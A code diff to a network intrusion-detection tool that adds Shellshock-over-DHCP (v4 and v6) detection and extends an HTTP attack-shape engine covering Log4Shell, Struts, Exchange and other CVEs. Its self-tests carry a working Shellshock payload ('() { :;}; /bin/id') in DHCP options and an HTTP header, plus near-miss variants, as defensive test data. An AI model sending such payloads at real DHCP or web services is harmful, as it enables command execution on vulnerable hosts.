@@ -2623,13 +2623,214 @@ def _dhcp_options(pk):
     return opts
 
 
+# ---- Shellshock via DHCP (v4): CVE-2014-6271 and its function-import siblings -------
+# DHCP clients and servers hand option values to shell hooks as environment variables
+# (dhclient-script new_*, NetworkManager dispatcher DHCP4_* / DHCP6_*, dnsmasq
+# --dhcp-script DNSMASQ_*), so a vulnerable bash imports a function from any of them.
+# Only the exact four bytes '() {' (28 29 20 7B) are imported - '(){', '()  {', a
+# leading space, a tab or a mid-value occurrence are all rejected by bash's parser
+# (measured against bash 5.2 by the module author) - so an exact-prefix match has no
+# encoding/case/spacing variant to hide behind. Detection is only as good as the field
+# enumeration, so every string-carrying field is walked: every DHCPv4 option,
+# options relocated into sname/file by option 52 overload, the option 82 / 125
+# sub-options dnsmasq exports, sname/file text, the DNS-wire names of option 119
+# (decoded, since clients export the decoded text) and, for DHCPv6, every option at
+# any depth through Relay-Forward/Relay-Reply (34-byte header) and IA_NA / IA_TA /
+# IA_PD / IAADDR / IAPREFIX, plus the vendor data behind option 16/17's enterprise
+# number and the option 24 / 39 names. Raw UDP payload bytes are parsed directly, so
+# scapy's DHCP6_RelayForward-is-not-a-DHCP6 quirk cannot hide relayed messages.
+# Attempt observed on the wire, never evidence a host ran a bash hook.
+_DHCP_SHELLSHOCK = b'() {'
+_DHCP_SHELLSHOCK_CVES = ['CVE-2014-6271', 'CVE-2014-7169', 'CVE-2014-6277',
+                         'CVE-2014-6278', 'CVE-2014-7186', 'CVE-2014-7187']
+_DHCP6_IA = {3: 12, 4: 4, 25: 12, 5: 24, 26: 25}   # option -> fixed header bytes
+_DHCP6_RELAY_TYPES = (12, 13)                      # RELAY-FORW / RELAY-REPL
+_DHCP6_SERVER_TYPES = (2, 7, 10, 13)               # ADVERTISE REPLY RECONFIGURE RELAY-REPL
+
+
+def _dhcp_v4_tlv(raw):
+    """[(code, value)] from a DHCPv4 option blob; tolerates pad, stops at end."""
+    out, i = [], 0
+    while i < len(raw):
+        code = raw[i]
+        if code == 255:
+            break
+        if code == 0:
+            i += 1
+            continue
+        if i + 2 > len(raw):
+            break
+        ln = raw[i + 1]
+        if i + 2 + ln > len(raw):
+            break
+        out.append((code, raw[i + 2:i + 2 + ln]))
+        i += 2 + ln
+    return out
+
+
+def _dhcp_dns_names(raw, allow_compression):
+    """RFC 1035 wire names -> text (option 119 may compress, RFC 3397 2; DHCPv6
+    24/39 may not). Pointer loops are bounded by a visited set and a hop cap."""
+    names, labels, i, visited, hops = [], [], 0, set(), 0
+    while i < len(raw):
+        ln = raw[i]
+        if ln == 0:
+            if labels:
+                names.append('.'.join(labels))
+                labels = []
+            i += 1
+            continue
+        if ln & 0xC0 == 0xC0:
+            if not allow_compression or i + 1 >= len(raw):
+                break
+            ptr = ((ln & 0x3F) << 8) | raw[i + 1]
+            hops += 1
+            if ptr in visited or hops > 16 or ptr >= len(raw):
+                break
+            visited.add(ptr)
+            i = ptr
+            continue
+        if ln > 63 or i + 1 + ln > len(raw):
+            break
+        labels.append(raw[i + 1:i + 1 + ln].decode('latin-1'))
+        i += 1 + ln
+    if labels:
+        names.append('.'.join(labels))
+    return names
+
+
+def _dhcp_v4_fields(payload):
+    """(op, [(path, raw)]) for every string-carrying field of a BOOTP/DHCPv4 UDP
+    payload. op 1 = BOOTREQUEST (client -> server), 2 = BOOTREPLY."""
+    if len(payload) < 240 or payload[236:240] != b'\x63\x82\x53\x63':
+        return None, []
+    main = _dhcp_v4_tlv(payload[240:])
+    out = [('option %d' % c, r) for c, r in main]
+    overload = next((r[0] for c, r in main if c == 52 and r), 0)
+    for c, r in main:
+        if c == 82:
+            out += [('option 82/%d' % sc, sr) for sc, sr in _dhcp_v4_tlv(r)]
+        elif c == 125:                       # V-I vendor: enterprise(4) len(1) data
+            i = 0
+            while i + 5 <= len(r):
+                dl = r[i + 4]
+                if i + 5 + dl > len(r):
+                    break
+                out += [('option 125/%d' % sc, sr)
+                        for sc, sr in _dhcp_v4_tlv(r[i + 5:i + 5 + dl])]
+                i += 5 + dl
+    for name, a, b, bit in (('file', 108, 236, 1), ('sname', 44, 108, 2)):
+        blob = payload[a:b]
+        if overload & bit:                   # carries options, not text
+            out += [('%s/option %d' % (name, c), r) for c, r in _dhcp_v4_tlv(blob)]
+        else:
+            text = blob.split(b'\x00', 1)[0]
+            if text:
+                out.append((name, text))
+    for path, r in list(out):
+        if path.endswith('option 119'):
+            out += [('decoded:' + path, n.encode('latin-1'))
+                    for n in _dhcp_dns_names(r, True)]
+    return payload[0], out
+
+
+def _dhcp_v6_fields(raw, depth=0, prefix=''):
+    """[(path, code, raw)] for every DHCPv6 option at any depth (relay + IA
+    nesting), from the raw UDP payload. Depth-guarded against stacked relays."""
+    out = []
+    if depth > 8 or not raw:
+        return out
+    hdr = 34 if raw[0] in _DHCP6_RELAY_TYPES else 4
+    body = raw[hdr:]
+    i = 0
+    while i + 4 <= len(body):
+        code = int.from_bytes(body[i:i + 2], 'big')
+        ln = int.from_bytes(body[i + 2:i + 4], 'big')
+        if i + 4 + ln > len(body):
+            break
+        val = body[i + 4:i + 4 + ln]
+        path = '%s/%d' % (prefix, code) if prefix else str(code)
+        out.append((path, code, val))
+        if code == 9:                        # Relay Message: a whole inner message
+            out += _dhcp_v6_fields(val, depth + 1, path)
+        elif code in _DHCP6_IA and len(val) > _DHCP6_IA[code]:
+            out += _dhcp_v6_fields(b'\x00' * 4 + val[_DHCP6_IA[code]:],
+                                   depth + 1, path)
+        i += 4 + ln
+    return out
+
+
+def _dhcp_shellshock_frame(payload, sport, dport):
+    """(family, direction, [(path, value)]) of Shellshock-prefixed fields in one
+    DHCP UDP payload, or None when it is not DHCP."""
+    ports = {sport, dport}
+    hits = []
+    if ports & {67, 68}:
+        op, fields = _dhcp_v4_fields(payload)
+        if op is None:
+            return None
+        direction = 'server_to_client' if op == 2 else 'client_to_server'
+        family = 'ipv4'
+        hits = [(p, r) for p, r in fields if r.startswith(_DHCP_SHELLSHOCK)]
+    elif ports & {546, 547}:
+        if not payload:
+            return None
+        direction = ('server_to_client' if payload[0] in _DHCP6_SERVER_TYPES
+                     else 'client_to_server')
+        family = 'ipv6'
+        for path, code, r in _dhcp_v6_fields(payload):
+            cands = [('v6 option ' + path, r)]
+            if code in (16, 17) and len(r) > 4:          # enterprise-number prefix
+                cands.append(('v6 option %s (vendor data)' % path, r[4:]))
+            if code == 39 and len(r) > 1:                 # FQDN flags byte
+                cands.append(('v6 option %s (fqdn)' % path, r[1:]))
+            if code in (24, 39):
+                body = r[1:] if code == 39 else r
+                cands += [('decoded:v6 option ' + path, n.encode('latin-1'))
+                          for n in _dhcp_dns_names(body, False)]
+            hits += [(p, v) for p, v in cands if v.startswith(_DHCP_SHELLSHOCK)]
+    else:
+        return None
+    return family, direction, hits
+
+
 def _dhcp_scan_frames(pkts):
     """Walk DHCP options across captured packets and flag the option-borne CVEs:
-    TunnelVision (CVE-2024-3661) and DynoRoot-class command injection
-    (CVE-2018-1111). Deduped per (kind, option). Separated from capture for the
-    self-test."""
+    TunnelVision (CVE-2024-3661), DynoRoot-class command injection (CVE-2018-1111)
+    and Shellshock via DHCP (CVE-2014-6271 family, DHCPv4 and DHCPv6). Deduped per
+    (kind, option) / (source, field). Separated from capture for the self-test."""
+    import hashlib
     findings, seen = [], set()
     for pk in pkts:
+        try:
+            from scapy.all import UDP, IP, IPv6
+            u = pk.getlayer(UDP)
+            ipl = pk.getlayer(IP) or pk.getlayer(IPv6)
+            shock = (_dhcp_shellshock_frame(bytes(u.payload), int(u.sport),
+                                            int(u.dport)) if u is not None else None)
+        except Exception:
+            shock, ipl = None, None
+        if shock and shock[2]:
+            family, direction, hits = shock
+            src = getattr(ipl, 'src', None)
+            for path, val in hits:
+                if ('ss', src, path) in seen:
+                    continue
+                seen.add(('ss', src, path))
+                sev = 'critical' if direction == 'server_to_client' else 'high'
+                who = ('a DHCP server (%s) to clients' % src
+                       if direction == 'server_to_client'
+                       else 'a DHCP client (%s) to the server\'s script hooks' % src)
+                findings.append({
+                    'code': 'dhcp-shellshock', 'cve': 'CVE-2014-6271',
+                    'cves': list(_DHCP_SHELLSHOCK_CVES), 'severity': sev,
+                    'option': path, 'family': family, 'direction': direction,
+                    'src': src, 'value_len': len(val),
+                    'value_sha256': hashlib.sha256(val).hexdigest(),
+                    'detail': ("bash function-import prefix '() {' at the start of "
+                               f"{family} DHCP {path}, sent by {who} — Shellshock "
+                               "attempt via DHCP (CVE-2014-6271 family). An attempt "
+                               "on the wire, not evidence a host ran a bash hook")})
         opts = _dhcp_options(pk)
         if not opts:
             continue
@@ -2679,9 +2880,12 @@ def _dhcp_cve_scan(interface, seconds):
     import tempfile
     fd, path = tempfile.mkstemp(suffix='.pcap')
     os.close(fd)
+    # 546/547 = DHCPv6 (Shellshock via DHCP is dual-stack); a bare `ip6 and udp`
+    # term would miss nothing here because DHCPv6 rides plain UDP, no ext headers.
     _run(['timeout', str(seconds), 'tcpdump', '-i', iface, '-nn', '-p',
           '-s', '1500', '-c', '5000', '-w', path,
-          'udp and (port 67 or port 68)'], timeout=int(seconds) + 8)
+          'udp and (port 67 or port 68 or port 546 or port 547)'],
+         timeout=int(seconds) + 8)
     try:
         from scapy.all import rdpcap
         try:
@@ -2701,7 +2905,10 @@ def do_dhcp_guardian(interface=None, capture_seconds=6, learn=True, quick=False)
 
     quick=True skips the passive starvation capture (rogue-server discovery
     only) — used by the background integrity monitor and the e-Paper page so
-    they stay fast. verdict: clean / suspicious / rogue / starvation."""
+    they stay fast. The full path also captures DHCPv4 + DHCPv6 and walks the raw
+    options for TunnelVision, DynoRoot and Shellshock (CVE-2014-6271 family).
+    verdict: clean / suspicious / rogue / attack / starvation (attack = a Shellshock
+    payload sent by a DHCP client at the server's script hooks)."""
     iface = interface if _valid_iface(interface or '') else _capture_iface()
     gw = _default_gateway()
     _, resolv_dns, _ = _read_resolv_conf()
@@ -2779,7 +2986,7 @@ def do_dhcp_guardian(interface=None, capture_seconds=6, learn=True, quick=False)
             reasons.append(f"{clients} distinct DHCP clients requested leases in "
                            f"{capture_seconds}s ({req} requests) — DHCP starvation "
                            "(pool-exhaustion) signature")
-        # --- (3) option-borne CVEs: TunnelVision / DynoRoot ----------------
+        # --- (3) option-borne CVEs: TunnelVision / DynoRoot / Shellshock -----
         dhcp_cves = _dhcp_cve_scan(iface, capture_seconds)
         for f in dhcp_cves:
             reasons.append(f['detail'])
@@ -2798,12 +3005,19 @@ def do_dhcp_guardian(interface=None, capture_seconds=6, learn=True, quick=False)
         reasons.append("no DHCP server answered — static addressing, or the "
                        "pool may be exhausted")
 
-    # Option-borne CVEs escalate the verdict: command injection is unambiguous
-    # (rogue-class), while a default-route-covering option 121 could be legitimate
-    # policy routing, so it only raises a clean verdict to suspicious.
+    # Option-borne CVEs escalate the verdict: command injection or a Shellshock
+    # payload FROM a DHCP server is unambiguous (rogue-class); a Shellshock payload
+    # from a CLIENT targets the server's own script hooks (attack); a default-route-
+    # covering option 121 could be legitimate policy routing, so it only raises a
+    # clean verdict to suspicious.
     if dhcp_cves and verdict != 'starvation':
-        if any(f['cve'] == 'CVE-2018-1111' for f in dhcp_cves):
+        if any(f['cve'] == 'CVE-2018-1111' or (
+                f['code'] == 'dhcp-shellshock'
+                and f.get('direction') == 'server_to_client') for f in dhcp_cves):
             verdict = 'rogue'
+        elif any(f['code'] == 'dhcp-shellshock' for f in dhcp_cves):
+            if verdict != 'rogue':
+                verdict = 'attack'
         elif verdict == 'clean':
             verdict = 'suspicious'
 
@@ -5305,6 +5519,69 @@ def _dhcp_selftest():
                       + _o(121, b'\x18\x0a\x0a\x0a\xc0\xa8\x01\x01'))
         cf = _dhcp_scan_frames([clean])
         ck('clean dhcp options -> no cve', not cf, got=[x['code'] for x in cf])
+
+        # -- v4 Shellshock via DHCP (CVE-2014-6271 family), dual-stack --------
+        SS = b'() { :;}; /bin/id'
+
+        def _ss(frames):
+            return [x for x in _dhcp_scan_frames(frames) if x['code'] == 'dhcp-shellshock']
+
+        def _bootp(ob, op=2, sname=b'', bfile=b''):
+            pl = (bytes([op]) + b'\x00' * 43 + sname.ljust(64, b'\x00')
+                  + bfile.ljust(128, b'\x00') + b'\x63\x82\x53\x63' + ob + b'\xff')
+            sp, dp = (67, 68) if op == 2 else (68, 67)
+            return (Ether() / IP(src='10.0.0.1' if op == 2 else '10.0.0.9',
+                                 dst='10.0.0.9' if op == 2 else '10.0.0.1')
+                    / UDP(sport=sp, dport=dp) / Raw(pl))
+
+        h = _ss([_bootp(_o(53, b'\x05') + _o(114, SS))])
+        ck('shellshock v4 server option 114 -> critical',
+           len(h) == 1 and h[0]['severity'] == 'critical'
+           and h[0]['direction'] == 'server_to_client'
+           and 'CVE-2014-7187' in h[0]['cves'], got=h)
+        ck('shellshock payload not logged, digest carried',
+           h and '/bin/id' not in json.dumps(h) and len(h[0]['value_sha256']) == 64)
+        h = _ss([_bootp(_o(53, b'\x03') + _o(12, SS), op=1)])
+        ck('shellshock v4 client hostname -> high, client_to_server',
+           len(h) == 1 and h[0]['severity'] == 'high'
+           and h[0]['direction'] == 'client_to_server', got=h)
+        h = _ss([_bootp(_o(53, b'\x05') + _o(52, b'\x02'),
+                        sname=_o(114, SS) + b'\xff')])
+        ck('shellshock v4 option 52 overload (sname carries options)',
+           any(x['option'] == 'sname/option 114' for x in h), got=h)
+        h = _ss([_bootp(_o(53, b'\x05'), bfile=SS)])
+        ck('shellshock v4 file field text', any(x['option'] == 'file' for x in h), got=h)
+        h = _ss([_bootp(_o(53, b'\x05') + _o(82, _o(1, SS)))])
+        ck('shellshock v4 option 82 sub-option',
+           any(x['option'] == 'option 82/1' for x in h), got=h)
+        h = _ss([_bootp(_o(53, b'\x05') + _o(119, bytes([len(SS)]) + SS + b'\x00'))])
+        ck('shellshock v4 option 119 decoded name',
+           any(x['option'].startswith('decoded:') for x in h), got=h)
+        near = [b'(){ :;}; id', b'()  { :;}; id', b' () { :;}; id', b'x () { :;}',
+                b'()\t{ :;}']
+        h = _ss([_bootp(_o(53, b'\x05') + _o(114, v)) for v in near])
+        ck('shellshock near-miss prefixes silent (only "() {" imports)', not h, got=h)
+
+        from scapy.all import IPv6 as _IPv6
+
+        def _v6(msg):
+            return (Ether() / _IPv6(src='fe80::1', dst='ff02::1:2')
+                    / UDP(sport=547, dport=546) / Raw(msg))
+
+        def _o6(c, v):
+            return c.to_bytes(2, 'big') + len(v).to_bytes(2, 'big') + v
+        reply = bytes([7, 0, 0, 1]) + _o6(3, b'\x00' * 12 + _o6(
+            5, b'\x00' * 24 + _o6(17, b'\x00\x00\x00\x09' + SS)))
+        h = _ss([_v6(reply)])
+        ck('shellshock v6 IA_NA/IAADDR nested vendor data',
+           any(x['family'] == 'ipv6' and '3/5/17' in x['option'] for x in h), got=h)
+        inner = bytes([7, 0, 0, 2]) + _o6(24, bytes([len(SS)]) + SS + b'\x00')
+        relay = bytes([13, 0]) + b'\x00' * 32 + _o6(9, inner)
+        h = _ss([_v6(relay)])
+        ck('shellshock v6 relay-reply -> decoded option 24 name',
+           any(x['option'].startswith('decoded:v6 option 9/24') for x in h), got=h)
+        clean6 = bytes([7, 0, 0, 3]) + _o6(24, b'\x04corp\x05local\x00')
+        ck('clean dhcpv6 domain list silent', not _ss([_v6(clean6)]))
     except Exception as _e:
         ck('dhcp-cve-scapy-skip', True, got='scapy unavailable: %s' % _e)
 
@@ -5313,13 +5590,15 @@ def _dhcp_selftest():
     g = globals()
     saved = {k: g[k] for k in ('_dhcp_discover', '_dhcp_capture',
                                '_default_gateway', 'do_arp_check',
-                               '_DHCP_BASELINE_PATH')}
+                               '_DHCP_BASELINE_PATH', '_dhcp_cve_scan')}
     try:
         g['_default_gateway'] = lambda: '192.168.1.1'
         g['do_arp_check'] = lambda *a, **k: {'verdict': 'clean'}
         state = {'offers': [], 'err': None, 'req': 0, 'clients': 0}
         g['_dhcp_discover'] = lambda iface, t=0: (state['offers'], state['err'])
         g['_dhcp_capture'] = lambda iface, s: (state['req'], state['clients'], None)
+        state['cves'] = []
+        g['_dhcp_cve_scan'] = lambda iface, s: list(state['cves'])
 
         def _fresh():
             g['_DHCP_BASELINE_PATH'] = os.path.join(tempfile.mkdtemp(), 'dhcp.json')
@@ -5343,6 +5622,17 @@ def _dhcp_selftest():
         state['clients'] = 0
         ck('verdict clean (single server)', do_dhcp_guardian(learn=True)['verdict'] == 'clean',
            got=do_dhcp_guardian(learn=True)['verdict'])
+
+        # v4 Shellshock: from a client -> attack; from a server -> rogue.
+        ss = {'code': 'dhcp-shellshock', 'cve': 'CVE-2014-6271', 'severity': 'high',
+              'direction': 'client_to_server', 'detail': 'shellshock (test)'}
+        state['cves'] = [ss]
+        v = do_dhcp_guardian(learn=True)['verdict']
+        ck('verdict attack (client Shellshock)', v == 'attack', got=v)
+        state['cves'] = [dict(ss, severity='critical', direction='server_to_client')]
+        v = do_dhcp_guardian(learn=True)['verdict']
+        ck('verdict rogue (server Shellshock)', v == 'rogue', got=v)
+        state['cves'] = []
     finally:
         for k, v in saved.items():
             g[k] = v
@@ -16302,9 +16592,9 @@ def _ssdp_selftest():
 # --------------------------------------------------------------------------
 # Layer 7, cleartext only: once TLS completes the HTTP layer is ciphertext, so SNI /
 # ALPN / JA3 / certificates stay TLS Watch's and Cert Watch's. Engine vendored as
-# python/httpwatch.py (+ httpwatch_selftest.py, 440 checks); this adapter owns the
+# python/httpwatch.py (+ httpwatch_selftest.py, 2323 checks; v7); this adapter owns the
 # capture (one bounded tcpdump window, -w only, never a probe) and feeds each scapy
-# packet through the engine's own dissect_packet() + HttpWatch.feed(). 28 codes:
+# packet through the engine's own dissect_packet() + HttpWatch.feed(). 49 codes:
 #   A  HTTP/1.x framing ambiguity (request smuggling / desync, HTTP-001..011): one
 #      RFC 9112 grammar engine runs a Content-Length framer and a Transfer-Encoding
 #      framer side by side; HTTP-009 (critical) fires when they end the message at
@@ -16320,7 +16610,74 @@ def _ssdp_selftest():
 #      Apache mod_reqtimeout's 500 B/s floor across >20 concurrent flows per source.
 #      No finding ever carries a usable secret: passwords / tokens / cookie values are
 #      replaced by an 8-hex SHA-256 prefix. HTTP-040/041 stand down on tcp/5985
-#      (RPC Watch owns WinRM authentication posture).
+#      (RPC Watch owns WinRM authentication posture). v3 adds HTTP-048: a Set-Cookie PHP
+#      session value past any size a cookie can work at — the PHP2Shell memory-
+#      disclosure stage (CVE-2026-109618 / CVE-2026-109619), lengths only, never the
+#      leaked bytes.
+#   E  (v3) attack-shaped request headers: Shellshock function import '() {' in any
+#      header (HTTP-080, CVE-2014-6271 family), Java4Shell Base64 padding no encoder
+#      produces in an auth header (HTTP-081, CVE-2026-114938), and a Struts S2-045
+#      Content-Type that meets all three OGNL-evaluation conditions (HTTP-084,
+#      CVE-2017-5638). Attempt findings: they never claim the target is vulnerable.
+#      v4 adds the Exchange / SharePoint request shapes, each the vendor's own check
+#      inverted: ProxyLogon (HTTP-086, CVE-2021-26855) - an X-BEResource back-end cookie
+#      whose host part Uri.CheckHostName rejects; ToolShell (HTTP-088, CVE-2025-49706 /
+#      CVE-2025-53771) - a sign-out-page Referer on a request reaching the ToolPane
+#      handler, matched by path segment so the trailing-slash patch bypass is covered.
+#      They see only the cleartext offload hop in front of Exchange / SharePoint (IIS
+#      serves no h2c), so silence on a TLS-end-to-end deployment is not evidence of
+#      safety. A sign-out Referer reaching any other non-allowlisted page is a
+#      corroborating counter only (toolshell_signout_nonallowlisted), never an alert.
+#      v5 adds Log4Shell (HTTP-091, CVE-2021-44228 / CVE-2021-45046) and Text4Shell
+#      (HTTP-092, CVE-2022-42889): a dangerous lookup (jndi; script / url / dns) reaching a
+#      field the library interpolates. The obfuscation IS the library's own substitution
+#      grammar, so ${${lower:j}ndi:...} is evaluated by a walker held against the real
+#      engines, not string-matched. Carriers are fixed-decoding only (headers, cookies,
+#      target, path, query, Basic credentials); bodies are never scanned. A walker that
+#      hits its nesting/expansion cap says so (walker_budget_exceeded), never passes
+#      silently. Pairs with LDAP Watch's JNDI-delivery rule (the LDAP callback leg).
+#      v7: N-central semicolon + Forwarded bypass (HTTP-099, CVE-2026-86206) - a raw ';'
+#      path parameter on the guarded first segment AND a Forwarded for= quoted string with
+#      a backslash escape (Jetty unescapes it to loopback, the app's check fails open);
+#      neither half alone fires (jsessionid paths and quoted IPv6 for= are legitimate),
+#      and a %3B path is deliberately silent (measured: it reaches nothing).
+#   F  (v3) attack-shaped request bodies (dechunked, multipart and urlencoded, every
+#      part decoded every plausible way): React2Shell Flight property-path reference
+#      (HTTP-082, CVE-2025-55182 / CVE-2025-66478), Spring4Shell class.* bean path
+#      (HTTP-083, CVE-2022-22965 / CVE-2010-1622), Struts S2-046 multipart filename
+#      OGNL (HTTP-085, CVE-2017-5638). v5: phpAfterShell (HTTP-089, CVE-2026-126714) - a
+#      PHP serialized-object header in a multipart parameter PHP's upload-progress
+#      handler stores in the session, decoded with PHP's measured rules (last duplicate
+#      wins, no OWS before '=', filename* ignored); `stored` records whether a non-file,
+#      non-empty part precedes it (PHP's necessary storage condition). Delivery only:
+#      the torn session write and the deserialization are not on the wire. A bare
+#      serialized scalar is a corroborating counter (php_scalar_record_shape), never an
+#      alert. v7 adds three Struts parameter-NAME rules decoded the way the servlet
+#      container and Commons FileUpload do: a parameter overwriting a file-upload property
+#      Struts sets itself (HTTP-093, S2-066/S2-067, CVE-2024-53677 / CVE-2023-50164), an
+#      OGNL opener after an action:/redirect:/redirectAction: prefix (HTTP-094, S2-016,
+#      CVE-2013-2251) and a method: remainder that is not a Java identifier (HTTP-095,
+#      S2-032, CVE-2016-3081); the Rack _method grammar (HTTP-096, Ruby2Shell,
+#      CVE-2026-132825 - warn when not an RFC 9110 token, critical with 0xDF in one of
+#      the 14 growing legacy encodings on a text/plain part); an inbound SOAP Fault
+#      carrying an Axis exceptionName in the position Axis loads it from (HTTP-097,
+#      CVE-2026-90436 - Faults travel server to client, so one in a REQUEST is the
+#      protocol running backwards); and a DOCTYPE in a SOAP request (HTTP-098, no CVE -
+#      both SOAP versions forbid it; critical with an external identifier, never
+#      dereferenced). v4: Exchange ProxyShell / ProxyNotShell
+#      (HTTP-087, CVE-2021-34473 / CVE-2022-41040) - the explicit-logon strip moves an
+#      autodiscover-routed request off the autodiscover handler; keyed on the strip, not
+#      the target, so the re-encoded targets that beat Microsoft's rewrite mitigations
+#      change nothing. The chained Exchange CVEs, OWASSRF and the ToolShell
+#      deserialization half are named in the engine's catalog / DEFERRED_CVES, not
+#      matched: their content is free-form.
+#   G  (v3) Brotli content-coding validation (HTTP-090, CVE-2026-111497): a request
+#      body is streamed through the HOST's own libbrotli, output discarded, and the
+#      block-switch format error a patched decoder raises is the finding. Arms only
+#      when that library is demonstrably patched (it names error code -17; a distro
+#      backport keeps the old version string, so the version is never the test) —
+#      a vulnerable decoder inside the sensor would make Ragnar exploitable by the
+#      traffic it watches. The arming outcome is reported in every result.
 #   D  h2c / gRPC: cleartext HTTP/2 in use, Rapid Reset (CVE-2023-44487, KEV, scaled
 #      to the server's own MAX_CONCURRENT_STREAMS), CONTINUATION abuse
 #      (CVE-2023-32731 / CVE-2023-33953), HPACK overlong integer (CVE-2023-33953),
@@ -16342,6 +16699,25 @@ _HTTP_SEV_TO_GUARD = {'critical': 'CRITICAL', 'high': 'HIGH', 'warn': 'MEDIUM',
 # not an exploitation primitive, so they get their own verdict.
 _HTTP_CRED_CODES = frozenset(('HTTP-040', 'HTTP-041', 'HTTP-042', 'HTTP-043',
                               'HTTP-044', 'HTTP-065'))
+_HTTP_BROTLI = None        # cached (probe-or-None, status dict): arm once per process
+
+
+def _http_brotli():
+    """Arm the Tier G Brotli check (HTTP-090) against the host's libbrotli, once.
+    Returns (probe, status). The engine refuses a decoder that does not name the
+    CVE-2026-111497 block-switch error code, so a vulnerable library is never fed
+    attacker bytes; status always says which way it went, because a Tier G that
+    silently did not arm looks exactly like a segment with no attacks on it."""
+    global _HTTP_BROTLI
+    if _HTTP_BROTLI is None:
+        hw = _http_import()
+        try:
+            probe = hw.arm_brotli()
+            _HTTP_BROTLI = (probe, {'armed': True, 'decoder': probe.path,
+                                    'version': probe.version_string})
+        except Exception as e:
+            _HTTP_BROTLI = (None, {'armed': False, 'reason': str(e)[:300]})
+    return _HTTP_BROTLI
 
 
 def _http_import():
@@ -16374,7 +16750,8 @@ def _http_ports(ports=None):
 
 
 def _http_verdict(findings, traffic=True):
-    """attack (a critical / high framing, HTTP.sys or h2/gRPC finding) >
+    """attack (a critical / high framing, HTTP.sys, PHP-leak, attack-shaped request
+    (Tier E/F), Brotli or h2/gRPC finding) >
     credential-exposure (high Tier C credentials in the clear) > anomaly (warn
     posture: CL+TE, obs-fold, Host conflict, slow-read, h2c on gNMI, trailers to
     http.sys) > observed (info only: h2c in use, TRACE, bare LF) > clean /
@@ -16416,7 +16793,8 @@ def _http_analyze(packets, ports):
     first bytes and returns findings. The same finding on the same client -> server
     pair is folded into one row with a count. No persistence — pure/testable."""
     hw = _http_import()
-    watch = hw.HttpWatch(tcp_ports=ports)
+    probe, brotli = _http_brotli()
+    watch = hw.HttpWatch(tcp_ports=ports, cfg=hw.WatchConfig(brotli=probe))
     seen = {'packets': 0, 'dissected': 0, 'ipv4': 0, 'ipv6': 0}
     agg = {}
     for pkt in packets:
@@ -16479,7 +16857,7 @@ def _http_analyze(packets, ports):
     elif traffic:
         reasons = ['Cleartext HTTP observed (%d flow(s), %d HTTP/1 message(s), %d h2 '
                    'frame(s)); no smuggling, HTTP.sys exploit shape, cleartext '
-                   'credential or h2c/gRPC abuse seen'
+                   'credential, attack-shaped header/body or h2c/gRPC abuse seen'
                    % (st.get('flows', 0), st.get('http1_messages', 0),
                       st.get('h2_frames', 0))]
     else:
@@ -16494,7 +16872,16 @@ def _http_analyze(packets, ports):
             'h2_frames': int(st.get('h2_frames', 0)),
             'packets': seen['packets'], 'dissected': seen['dissected'],
             'ipv4': seen.get('ipv4', 0), 'ipv6': seen.get('ipv6', 0),
-            'ports': list(ports), 'engine': getattr(hw, '__version__', '')}
+            'ports': list(ports), 'engine': getattr(hw, '__version__', ''),
+            'brotli': brotli,
+            # corroborating only (v4): a SharePoint sign-out Referer reaching a page off
+            # the default allowlist other than ToolPane - never an alert on its own.
+            'toolshell_signout_nonallowlisted':
+                int(st.get('toolshell_signout_nonallowlisted', 0)),
+            # v5: corroborating PHP scalar-record shapes (never an alert), and lookup-
+            # walker cap hits - a capped walk is reported, never a silent pass.
+            'php_scalar_record_shape': int(st.get('php_scalar_record_shape', 0)),
+            'walker_budget_exceeded': int(st.get('walker_budget_exceeded', 0))}
 
 
 def _http_capture(iface, seconds, ports):
@@ -16531,7 +16918,13 @@ def do_http_watch(interface=None, seconds=20, ports=None, pcap=None, quick=False
     Flags request smuggling / desync (CL vs TE framer disagreement, malformed
     Transfer-Encoding / Content-Length / chunk grammar), the HTTP.sys parser CVE
     shapes (MS15-034 Range, Accept-Encoding, trailers), credentials in the clear
-    (always redacted), slow-read abuse, and h2c / gRPC abuse (Rapid Reset,
+    (always redacted), slow-read abuse, the PHP session-cookie memory leak, attack-
+    shaped requests (Shellshock, Java4Shell, Struts S2-045 / S2-046, Spring4Shell,
+    React2Shell, Exchange ProxyLogon / ProxyShell / ProxyNotShell, SharePoint
+    ToolShell, phpAfterShell, Log4Shell, Text4Shell, Struts S2-016 / S2-032 / S2-066 /
+    S2-067, Rack Ruby2Shell, Axis inbound SOAP Fault, SOAP DOCTYPE, N-central
+    Forwarded bypass), Brotli block-switch violations (armed only on a patched host
+    libbrotli; see result['brotli']) and h2c / gRPC abuse (Rapid Reset,
     CONTINUATION, HPACK, gRPC header and metadata). Dual-stack. HIGH / CRITICAL
     findings feed Watchtower unless quick or replaying a pcap."""
     plist = _http_ports(ports)
@@ -16577,11 +16970,16 @@ def do_http_watch(interface=None, seconds=20, ports=None, pcap=None, quick=False
 
 
 def _http_selftest():
-    """Self-test HTTP Watch: the vendored engine's own 440-check suite, focused
+    """Self-test HTTP Watch: the vendored engine's own 2323-check suite, focused
     smuggling / clean / credential-redaction / WinRM-suppression / HTTP.sys Range
-    boundary scenarios, the verdict ladder, the catalog shape, the Watchtower
-    normalizer, and a Scapy pcap end-to-end leg through do_http_watch carrying an
-    IPv6 extension header."""
+    boundary scenarios, the v3 attack-shaped request rules (Shellshock, Struts
+    S2-045, Spring4Shell), the v4 Exchange / SharePoint rules (ProxyLogon,
+    ProxyShell / ProxyNotShell, ToolShell), the v5 phpAfterShell / Log4Shell /
+    Text4Shell rules and the v7 Struts / Rack / Axis / SOAP / N-central rules, each
+    with a near-miss, Brotli arming, the
+    verdict ladder,
+    the catalog shape, the Watchtower normalizer, and a Scapy pcap end-to-end leg
+    through do_http_watch carrying an IPv6 extension header."""
     hw = _http_import()
     scenarios = []
 
@@ -16633,6 +17031,292 @@ def _http_selftest():
     ck('http020_below_bar_silent',
        'HTTP-020' not in {f.code for f in feed(rng((1 << 63) - 1))})
 
+    # Tier E (v3): Shellshock function import in any request header. Only the exact
+    # four bytes '() {' are imported by bash, so '(){' (no space) must stay silent.
+    def get_ua(ua):
+        return b'GET /cgi-bin/status HTTP/1.1\r\nHost: nas\r\nUser-Agent: ' + ua + b'\r\n\r\n'
+    fs = feed(get_ua(b'() { :;}; /bin/id'))
+    ck('http080_shellshock_header',
+       any(f.code == 'HTTP-080' and 'CVE-2014-6271' in f.cves for f in fs))
+    ck('http080_ipv6_parity',
+       'HTTP-080' in {f.code for f in feed(get_ua(b'() { :;}; /bin/id'),
+                                           src='fd00::9', dst='fd00::5')})
+    ck('http080_no_space_variant_silent',
